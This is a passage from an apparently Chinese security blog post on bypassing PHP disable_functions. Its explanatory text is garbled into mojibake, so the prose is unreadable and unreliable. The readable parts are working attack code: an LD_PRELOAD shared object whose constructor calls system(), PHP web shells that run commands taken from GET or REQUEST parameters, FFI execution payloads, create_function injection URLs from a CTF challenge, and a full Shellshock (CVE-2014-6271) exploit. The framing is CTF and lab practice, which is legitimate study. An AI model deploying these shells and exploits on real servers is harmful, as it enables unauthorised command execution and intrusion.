alt="image-20231206165347655"><br>ÂºÑÂÆåËøô‰∏™‰πãÂêéÊàëÁ∫†Áªì‰∫ÜÂæà‰πÖÊÄé‰πàÂéªÊâæÂà∞getuidÁöÑÊ∫êÁ†ÅÔºå‰ΩÜÂêéÈù¢ÂèëÁé∞ÂÖ∂ÂÆû‰∏çÊâæÂà∞Ê∫êÁ†Å‰πüÊòØÂèØ‰ª•ÁöÑÔºåÂõ†‰∏∫‰Ω†ÂÜôÁöÑÈÇ£‰∏™getuidÂΩìidÂëΩ‰ª§ÊâßË°åÁöÑÊó∂ÂÄôÂéªÂä†ËΩΩ‰∏ç‰ºöÁÆ°‰Ω†ÈáåÈù¢ÊÄé‰πàÊâßË°åÁöÑÔºåÂè™‰ºöÂéªÂØπÂ∫îÂèÇÊï∞ÔºåÂèÇÊï∞ÂÜôÂØπ‰∫ÜÂç≥ÂèØÔºåÊ≤°ÂÜôÂØπÁöÑËØùÊä•Èîô‰πü‰ºöÁªô‰Ω†Êä•Âá∫Êù•Ê≠£Á°ÆÁöÑÂ∫îËØ•ÊÄé‰πàÂÜôÔºåÂ¶ÇÊâßË°ålsÊó∂Ë∞ÉÁî®ÁöÑ<code>strncmp()</code>ÂáΩÊï∞ÔºåÁúã‰∏ãÈù¢Âçö‰∏ªÁöÑÂõæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653257.png" alt="image-20231206165356149"></p><h3 id="ÂÆûÊàòphp‰∏≠ÊÄé‰πàÂà©Áî®"><a href="#ÂÆûÊàòphp‰∏≠ÊÄé‰πàÂà©Áî®" class="headerlink" title="ÂÆûÊàòphp‰∏≠ÊÄé‰πàÂà©Áî®"></a>ÂÆûÊàòphp‰∏≠ÊÄé‰πàÂà©Áî®</h3><p>‰∏äÈù¢ÊòØÂú®ÊµãËØïËøô‰∏™ÊñπÊ≥ïÁöÑÂü∫Êú¨‰ΩøÁî®ÔºåÂà©Áî®ÁöÑÊòØLinux‰∏≠ÁöÑidÂëΩ‰ª§‰ºöË∞ÉÁî®ÁöÑÂ§ñÈÉ®Á®ãÂ∫èÊù•ÂÅöÊµãËØïÔºå‰∏ãÈù¢Â∞±ÈúÄË¶ÅÂØªÊâæÂú®php‰∏≠Âì™‰∫õÂáΩÊï∞‰ºöÂêØÂä®‰∏Ä‰∏™Êñ∞ËøõÁ®ãÔºåÂç≥Ë∞ÉÁî®Â§ñÈÉ®ÂáΩÊï∞ÔºåÂè™Ë¶ÅÂêØÂä®Êñ∞ËøõÁ®ãÂç≥ÂèØÂà©Áî®ÔºåÊó†ÊâÄË∞ìÊòØÂì™‰∏™ÂáΩÊï∞<br>Ê†πÊçÆÂâçËæà‰ª¨ÁöÑÁªèÈ™åÂ∏∏Áî®ÁöÑÊúâmail()„ÄÅerror_log()ÂáΩÊï∞Ôºå‰∏§‰∏™ÂáΩÊï∞Âú®Ë∞ÉÁî®Êó∂ÈÉΩ‰ºöÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑËøõÁ®ã<code>/usr/sbin/sendmail</code>ÔºåÂΩìÁÑ∂ËøôÈáåsendmailÈªòËÆ§ÊòØÊ≤°ÊúâÂÆâË£ÖÁöÑÔºåÂèØ‰ª•Ëá™Ë°åÂÆâË£Ö‰∏Ä‰∏ã<code>apt-get install sendmail</code>ÔºåÂ§±Ë¥•ÁöÑËØùÊâßË°å‰∏Ä‰∏ã<code>apt-get update</code>Âç≥ÂèØÔºåÂè¶Â§ñimap_mail()ÂáΩÊï∞‰πü‰ºöÂêØÂä®‰∏Ä‰∏™Êñ∞ËøõÁ®ãÂ§ßÊ¶ÇÁéá‰πüÊòØÂèØË°åÁöÑÔºå</p><p>ËøôÈáåÂ∞±Âè™ÊµãËØïmail()ÂáΩÊï∞ÔºåÂÆÉÂêØÂä®ÁöÑÊñ∞ËøõÁ®ã‰∏≠sendmailÈáåÈù¢‰πü‰ºöË∞ÉÁî®getuidÂáΩÊï∞ÔºåÊâÄ‰ª•ÁªßÁª≠Âä´ÊåÅËøô‰∏™getuidÂç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654263.png" alt="image-20231206165417218"><br>ÁÑ∂ÂêéÁºñÂÜô‰∏™mail.php‰ª£Á†ÅÂéªË∞ÉÁî®mailÂáΩÊï∞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/home/joker27/tmp/test.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂíå.soÊñá‰ª∂ÊîæÂú®‰∏ÄËµ∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654099.png" alt="image-20231206165434047"><br>‰∏äÈù¢ÁöÑ.soÊñá‰ª∂Êîπ‰∫Ü‰∏Ä‰∏ãÈÇ£‰∏™Áî®Âú®ËøôÈáåÊ≤°ÊúâÂõûÊòæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654544.png" alt="image-20231206165443493"><br>ÁÑ∂ÂêéÁõ¥Êé•ËÆøÈóÆmail.phpÂç≥ÂèØÊâßË°å‰ª£Á†ÅÔºå‰πüÂèØ‰ª•Âà©Áî®Êñá‰ª∂ÂåÖÂê´‰πüÂèØÊâßË°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655303.png" alt="image-20231206165500254"><br>ÁÑ∂ÂêéËøôÈáåÂÜçË¥¥‰∏™ÂèØ‰ª•Âà©Áî®ÁöÑÂáΩÊï∞ÊÄªÁªì</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mail()</span><br><span class="line">error_log()</span><br><span class="line">mb_send_mail()ÈúÄË¶ÅÂÆâË£ÖmbstringÊ®°ÂùóÔºåÂà©Áî®‰∏émail()Á±ª‰ºº</span><br><span class="line">imap_mail()ÈúÄË¶ÅÂÆâË£ÖimapÊ®°Âùó</span><br><span class="line">libvirt_connect()ÈúÄË¶ÅlibvirtÊ®°Âùó</span><br><span class="line">gnupg_init()ÈúÄË¶ÅgnupgÊ®°Âùó</span><br></pre></td></tr></table></figure><p>Êâæ‰∫ÜÂçäÂ§©Áªà‰∫éÊâæÂà∞‰∏ÄÁØáÂçöÂÆ¢ÔºåÈáåÈù¢‰∏ÄÊÆµËØùËÆ©ÊàëÂØπËøô‰∏™ËøáÁ®ãÊõ¥Âä†ÁöÑÊ∏ÖÊô∞</p><blockquote><p>ÂΩìÁ≥ªÁªüËØïÂõæË∞ÉÁî®ÊüêÂáΩÊï∞Êó∂ÔºåËØ•ÂáΩÊï∞‰Ωç‰∫éÁâπÂÆöÁöÑÂÖ±‰∫´Â∫ì(xxx.so)„ÄÇÂõ†Ê≠§ÔºåÁ≥ªÁªüÂú®Ë∞ÉÁî®‰πãÂâçÂ∞ÜÂä†ËΩΩxxx.so„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂ¶ÇÊûúÊàëÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™evil.soÊúâ‰∫ÜÂêåÂêçÁöÑÂáΩÊï∞ÔºåÂ∞±ËÉΩÂ∞ÜÂÖ∂Ë¶ÜÁõñ‰πã„ÄÇ</p></blockquote><p>‰∏äÈù¢ÈÉΩÊòØÂä´ÊåÅÁöÑgetuidËøô‰∏™ÂáΩÊï∞ÔºåÈúÄË¶ÅÂêØÂä®ÁöÑÊñ∞ËøõÁ®ã‰∏≠ÊúâÂáΩÊï∞ÂéªË∞ÉÁî®ÂÆÉÊâçË°åÔºåÊúâ‰∏ÄÂÆöÁöÑÈôêÂà∂ÊÄßÔºå‰∏ãÈù¢ÁúãÊÄé‰πàÁ™ÅÁ†¥Ëøô‰∏™ÈôêÂà∂<br><strong>Âä´ÊåÅÂÖ±‰∫´ÂØπË±°</strong><br>ÂÖ±‰∫´ÂØπË±°ÔºàShared Object, SOÔºâÂç≥.soÊñá‰ª∂Ôºå‰∏äÈù¢ÁöÑÊòØÂΩìmailÂáΩÊï∞ÂêØÂä®‰∏Ä‰∏™Êñ∞ËøõÁ®ã‰πãÂêé‰ºöÂéª.soÊñá‰ª∂Âç≥ÂÖ±‰∫´ÂØπË±°ÈáåÈù¢Êâæ‰∏Ä‰∫õË¶ÅË∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÊâæÂà∞sendmailÂêésendmailÈáåÈù¢ÂÜçÂéªË∞ÉÁî®getuidÂáΩÊï∞Ôºå‰ΩÜÊòØsendmail‰∏ç‰∏ÄÂÆö‰ºöÂÆâË£ÖÈÇ£‰πàÂä´ÊåÅgetuid‰πüÂ∞±Ê≤°ÊúâÁî®‰∫ÜÔºåÈÇ£‰πàÊúâÊ≤°Êúâ‰∏ÄÁßçÊñπÊ≥ïÂú®Âä†ËΩΩÂÖ±‰∫´ÂØπË±°Êó∂Â∞±ËÉΩÊâßË°åÊÅ∂ÊÑè‰ª£Á†ÅÔºåÁ≠îÊ°àËÇØÂÆöÊòØÊúâÁöÑÔºåÂà©Áî®<code>__attribute__((constructor))</code>Âç≥ÂèØÔºåÂÆÉÂèØ‰ª•ËÆ©Áî±ÂÆÉ‰øÆÈ•∞ÁöÑÂáΩÊï∞Âú® main() ‰πãÂâçÊâßË°åÔºåËã•ÂÆÉÂá∫Áé∞Âú®ÂÖ±‰∫´ÂØπË±°‰∏≠Êó∂ÔºåÈÇ£‰πà‰∏ÄÊó¶ÂÖ±‰∫´ÂØπË±°Ë¢´Á≥ªÁªüÂä†ËΩΩÔºåÁ´ãÂç≥Â∞ÜÊâßË°å <code>__attribute__((constructor))</code>‰øÆÈ•∞ÁöÑÂáΩÊï∞<br>ËøôÈÉ®ÂàÜÁöÑ‰ª£Á†ÅÂ∞±Áõ¥Êé•Áî®yangyangwithgnuËøô‰Ωç‰Ω¨ÁöÑ‰ª£Á†ÅÂ∞±Ë°å‰∫Ü<br>È¶ñÂÖàÊòØ.cÊñá‰ª∂</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get command line options and arg</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL_CMDLINE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unset environment variable LD_PRELOAD.</span></span><br><span class="line">    <span class="comment">// unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span></span><br><span class="line">    <span class="comment">// distribution (e.g., centos), I need crafty trick.</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">&quot;LD_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">                    environ[i][<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// executive command</span></span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊääËøô‰∏™.cÁºñËØë‰∏∫.soÊñá‰ª∂Âç≥ÂèØÔºåÁÑ∂ÂêéÊòØÂä†ËΩΩ.soÊñá‰ª∂ÁöÑphp‰ª£Á†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ËøôÊÆµ‰ª£Á†ÅÊé•Êî∂‰∏â‰∏™GETÂèÇÊï∞Ôºå‰∏ÄÊòØ cmd ÂèÇÊï∞ÔºåÂæÖÊâßË°åÁöÑÁ≥ªÁªüÂëΩ‰ª§ÔºàÂ¶Ç pwdÔºâÔºõ‰∫åÊòØ outpath ÂèÇÊï∞Ôºå‰øùÂ≠òÂëΩ‰ª§ÊâßË°åËæìÂá∫ÁªìÊûúÁöÑÊñá‰ª∂Ë∑ØÂæÑÔºàÂ¶Ç &#x2F;tmp&#x2F;xxÔºâÔºå‰æø‰∫éÂú®È°µÈù¢‰∏äÊòæÁ§∫ÔºåÂè¶Â§ñÂÖ≥‰∫éËØ•ÂèÇÊï∞Ôºå‰Ω†Â∫îÊ≥®ÊÑè web ÊòØÂê¶ÊúâËØªÂÜôÊùÉÈôê„ÄÅweb ÊòØÂê¶ÂèØË∑®ÁõÆÂΩïËÆøÈóÆ„ÄÅÊñá‰ª∂Â∞ÜË¢´Ë¶ÜÁõñÂíåÂà†Èô§Á≠âÂá†ÁÇπÔºõ‰∏âÊòØ sopath ÂèÇÊï∞ÔºåÊåáÂÆöÂä´ÊåÅÁ≥ªÁªüÂáΩÊï∞ÁöÑÂÖ±‰∫´ÂØπË±°ÁöÑÁªùÂØπË∑ØÂæÑÔºàÂ¶Ç &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.soÔºâÔºåÂè¶Â§ñÂÖ≥‰∫éËØ•ÂèÇÊï∞Ôºå‰Ω†Â∫îÊ≥®ÊÑè web ÊòØÂê¶ÂèØË∑®ÁõÆÂΩïËÆøÈóÆÂà∞ÂÆÉ„ÄÇ<br>‰∏ãÈù¢‰∏ä‰º†‰ª£Á†ÅÊµãËØï‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655149.png" alt="image-20231206165528022"><br>ÊàêÂäüÁªïËøáÊâßË°åÔºåÊ≥®ÊÑèoutpathÂêéÈù¢ÁöÑË∑ØÂæÑ‰∏ÄÂÆöË¶ÅÂèØÂÜôÊâçË°åÔºåËøôÁßçÊñπÂºè‰πüÂèØ‰ª•Âú®awd‰∏≠ÂéªÂä´ÊåÅ<code>ls„ÄÅcat</code>Á≠âÂëΩ‰ª§ÔºåËÆ©‰ªñÂú®ÊâßË°åÂëΩ‰ª§ÁöÑÊó∂ÂÄôÂ∞±ÊääflagÂèëÁªô‰Ω†‰∫Ü<br>[[LD_PRELOADÂä´ÊåÅ]]</p><h2 id="Âà©Áî®PHP7-4-FFIÁªïËøá"><a href="#Âà©Áî®PHP7-4-FFIÁªïËøá" class="headerlink" title="Âà©Áî®PHP7.4 FFIÁªïËøá"></a>Âà©Áî®PHP7.4 FFIÁªïËøá</h2><h3 id="Âà©Áî®Êù°‰ª∂-1"><a href="#Âà©Áî®Êù°‰ª∂-1" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Linux Êìç‰ΩúÁ≥ªÁªü</li><li>PHP &gt;&#x3D; 7.4</li><li>ÂºÄÂêØ‰∫Ü FFI Êâ©Â±ï‰∏î<code>ffi.enable=true</code><br>ffi.enableÈªòËÆ§ÊòØÊ≤°ÊúâÂºÄÂêØÁöÑ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655200.png" alt="image-20231206165546145"><br>ÁÑ∂ÂêéÂéªphp.iniÁªôÂÆÉËÆæÁΩÆ‰∏∫true<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655541.png" alt="image-20231206165555494"><br>ÁÑ∂ÂêéÈáçÂêØ‰∏Ä‰∏ãapacheÂç≥ÂèØÁîüÊïàÔºåËÆ∞ÂæóÈáçÂêØÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÈÄöËøácËØ≠Ë®ÄÁöÑsystemÂéªÊâßË°å,ÁªïËøádisable functions„ÄÇ<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656357.png" alt="image-20231206165616298"><br>ÂΩìÊ≤°ÊúâÊùÉÈôêÂàõÂª∫ÊàñËÄÖ‰øÆÊîπÊñá‰ª∂Êó∂ÂèØ‰ª•ÂèÇËÄÉbuu‰∏ä<strong>FighterFightsInvincibly</strong>‰∏ÄÈ¢ò</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123;$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/*</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;ls /&quot;);/*</span><br></pre></td></tr></table></figure><h2 id="Âà©Áî®Bash-Shellshock-CVE-2014-6271-Á†¥Â£≥ÊºèÊ¥û"><a href="#Âà©Áî®Bash-Shellshock-CVE-2014-6271-Á†¥Â£≥ÊºèÊ¥û" class="headerlink" title="Âà©Áî®Bash Shellshock(CVE-2014-6271)Á†¥Â£≥ÊºèÊ¥û"></a>Âà©Áî®Bash Shellshock(CVE-2014-6271)Á†¥Â£≥ÊºèÊ¥û</h2><h3 id="Âà©Áî®Êù°‰ª∂-2"><a href="#Âà©Áî®Êù°‰ª∂-2" class="headerlink" title="Âà©Áî®Êù°‰ª∂"></a>Âà©Áî®Êù°‰ª∂</h3><ul><li>Âà©Áî®Êù°‰ª∂php &lt; 5.6.2 &amp; bash &lt;&#x3D; 4.3ÔºàÁ†¥Â£≥Ôºâ<blockquote><p>ÊºèÊ¥ûÂéüÁêÜÂ¶Ç‰∏ãÔºö<br>Bash‰ΩøÁî®ÁöÑÁéØÂ¢ÉÂèòÈáèÊòØÈÄöËøáÂáΩÊï∞ÂêçÁß∞Êù•Ë∞ÉÁî®ÁöÑÔºåÂØºËá¥ÊºèÊ¥ûÂá∫ÈóÆÈ¢òÊòØ‰ª•‚Äú(){‚ÄùÂºÄÂ§¥ÂÆö‰πâÁöÑÁéØÂ¢ÉÂèòÈáèÂú®ÂëΩ‰ª§ENV‰∏≠Ëß£ÊûêÊàêÂáΩÊï∞ÂêéÔºåBashÊâßË°åÂπ∂Êú™ÈÄÄÂá∫ÔºåËÄåÊòØÁªßÁª≠Ëß£ÊûêÂπ∂ÊâßË°åshellÂëΩ‰ª§„ÄÇËÄåÂÖ∂Ê†∏ÂøÉÁöÑÂéüÂõ†Âú®‰∫éÂú®ËæìÂÖ•ÁöÑËøáÊª§‰∏≠Ê≤°Êúâ‰∏•Ê†ºÈôêÂà∂ËæπÁïåÔºå‰πüÊ≤°ÊúâÂÅöÂá∫ÂêàÊ≥ïÂåñÁöÑÂèÇÊï∞Âà§Êñ≠„ÄÇ</p></blockquote></li></ul><p>Ëøô‰∏™Â§çÁé∞Â∞±Áõ¥Áî®vulhubÁöÑÁéØÂ¢É‰∫ÜÔºåÂà©Áî®Ëøô‰∏™ÁªïËøáÂÖ∂ÂÆûÂ∞±ÊòØÁúãÂ≠ò‰∏çÂ≠òÂú®Á†¥Â£≥ÊºèÊ¥û<br>ÁÆÄÂçïÊµãËØï‰∏Ä‰∏ãÊòØÂê¶Â≠òÂú®Á†¥Â£≥ÊºèÊ¥û</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure><p>Â¶ÇÊûúËæìÂá∫vulnerableË°®Á§∫Â≠òÂú®<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656407.png" alt="image-20231206165631346"><br>Âà©Áî®expÂ¶Ç‰∏ã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Â∞Ü‰∏äÈù¢ÁöÑexp‰∏ä‰º†Âà∞Èù∂Êú∫ÁöÑtmpÁõÆÂΩï‰∏ãÁÑ∂ÂêéÂéªÂåÖÂê´ÂÜçÊâßË°åÂëΩ‰ª§Âç≥ÂèØÔºåËøôÈáåÊ≤°ÊúâÂ•ΩÁöÑÊµãËØïÁéØÂ¢ÉÊàëÂ∞±‰∏çÊµã‰∫ÜÔºåË¥¥‰∏™Âõæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656688.png" alt="image-20231206165656631"></p><h2 id="Âà©Áî®imap-open-ÁªïËøá"><a href="#Âà©Áî®imap-open-ÁªïËøá" 